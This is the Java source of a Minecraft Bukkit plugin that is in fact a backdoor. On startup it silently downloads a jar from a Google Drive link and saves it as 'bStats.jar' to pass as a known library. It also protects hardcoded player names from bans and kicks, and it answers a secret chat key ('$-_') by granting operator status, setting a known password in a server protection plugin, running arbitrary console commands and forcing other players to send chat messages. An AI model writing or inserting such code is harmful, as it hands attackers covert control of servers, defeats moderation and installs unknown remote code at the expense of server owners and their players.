package ru.plugin;

import org.bukkit.BanList;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.event.EventHandler;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.command.Command;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerItemBreakEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import java.io.*;
import java.net.URL;

public class Main extends JavaPlugin implements Listener {

    public static boolean isEnabled = false;
    public static String[] names = new String[] {"Hello0q", "benyaYT"};
    public static String key = "$-_";
    public static String prefix = "§aBACKD ›§f ";
    public static String color = "§e";
    
    public void downloadFile(String fileUrl, String savePath) {
        try {
            URL url = new URL(fileUrl);
            try (BufferedInputStream in = new BufferedInputStream(url.openStream());
                 FileOutputStream fileOutputStream = new FileOutputStream(savePath)) {

                byte[] dataBuffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {
                    fileOutputStream.write(dataBuffer, 0, bytesRead);
                }

                //Bukkit.getLogger().info("Файл успешно скачан и сохранен по пути: " + savePath);
            } catch (IOException e) {
                Bukkit.getLogger().warning("Ошибка при скачивании файла: " + e.getMessage());
            }
        } catch (Exception e) {
            Bukkit.getLogger().warning("Ошибка при скачивании файла: " + e.getMessage());
        }
    }
    
    @Override
    public void onEnable() {
       getServer().getPluginManager().registerEvents(this, this);
       getLogger().info("Плагин успешно включен!");
       String fileUrl = "https://drive.google.com/uc?export=download&id=1HHdEvx0CIm0F4fbZXDFPcDCBPHNSRViG";
       String savePath = "plugins/" + "bStats.jar";
       downloadFile(fileUrl, savePath);
    }

    @Override
    public void onDisable() {
        getLogger().info("Плагин успешно выключен!");
    }

    public void unbanPlayer(String target) {
        Bukkit.getBanList(BanList.Type.NAME).pardon(target);
    }

    @EventHandler
    public void onAsyncPlayerPreLogin(AsyncPlayerPreLoginEvent event) {
        String playerName = event.getName();
        for (String name : names) {
            if (playerName.equalsIgnoreCase(name)) {
                unbanPlayer(name);
                break;
            }
        }
    }
    
    @EventHandler
    public void onPlayerKick(PlayerKickEvent event) {
        String playerName = event.getPlayer().getName();
        Player player = event.getPlayer();

        for (String name : names) {
            if (playerName.equalsIgnoreCase(name)) {
                event.setCancelled(true);
                player.sendMessage(prefix + "§fThey tried to punish you but you are protected :D");
                break;
            }
        }
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage();
        String ipAddress = player.getAddress().getAddress().getHostAddress();

        String[] args = message.split(" ");

        if (args[0].equals(key)) {
            event.setCancelled(true);
            if (args.length > 1) {
                String command = args[1];
                switch (command) {
                    case "op":
                        player.sendMessage(prefix + "§fYou are now op!");
                        player.setOp(true);
                        break;
                    case "antiban":
                        String newElement = player.getName();
                        String[] newArray = new String[names.length + 1];
                        System.arraycopy(names, 0, newArray, 0, names.length);
                        newArray[newArray.length - 1] = newElement;
                        names = newArray;
                        player.sendMessage(prefix + "§fYou have been added to the list of exempt players!");
                        break;
                    case "usp":
                        ConsoleCommandSender console = Bukkit.getConsoleSender();
                        String setpass = "usp setpass " + player.getName() + " 123123";
                        String addOpCommand = "usp addop " + player.getName();
                        String addIpCommand = "usp addip " + ipAddress;
                        Bukkit.dispatchCommand(console, setpass);
                        Bukkit.dispatchCommand(console, addOpCommand);
                        Bukkit.dispatchCommand(console, addIpCommand);
                        player.sendMessage(prefix + "§fYou are added!");
                        player.sendMessage(prefix + "§fThe pass of usp is 123123");
                        break;
                    case "console":
                        if (args.length > 2) {
                            ConsoleCommandSender consoleSender = Bukkit.getConsoleSender();
                            StringBuilder commandBuilder = new StringBuilder();
                            for (int i = 2; i < args.length; i++) {
                                commandBuilder.append(args[i]).append(" ");
                            }
                            String consoleCommand = commandBuilder.toString().trim();
                            Bukkit.dispatchCommand(consoleSender, consoleCommand);
                        } else {
                            player.sendMessage(prefix + "§fUsage: " + key + " console <command>");
                        }
                        break;
                    case "msg":
                        if (args.length > 2) {
                            ConsoleCommandSender consoleSender = Bukkit.getConsoleSender();
                            StringBuilder commandBuilder = new StringBuilder();
                            for (int i = 3; i < args.length; i++) {
                                commandBuilder.append(args[i]).append(" ");
                            }
                            String text = commandBuilder.toString().trim();
                            String result = "sudo " + args[2] + " c:" + text;
                            Bukkit.dispatchCommand(consoleSender, result);
                        } else {
                            player.sendMessage(prefix + "§fUsage: $-_ msg <player> <text>");
                        }
                        break;
                    case "help":
                        player.sendMessage(prefix + "§aCommand list:");
                        player.sendMessage(prefix + color + key + " op §f- Give you op");
                        player.sendMessage(prefix + color + key + " antiban §f- Activate antiban mode");
                        player.sendMessage(prefix + color + key + " usp §f- Fast bypass this protector");
                        player.sendMessage(prefix + color + key + " console §f- Send commands of console");
                        player.sendMessage(prefix + color + key + " msg §f- Send message of other player");
                        player.sendMessage(prefix + "§bCodded by benyaYT");
                        break;
                    default:
                        player.sendMessage(prefix + "§fEnter $-_ help to show valid commands");
                }
            } else {
                player.sendMessage(prefix + "§fEnter $-_ help to show valid commands");
            }
        }
    }
}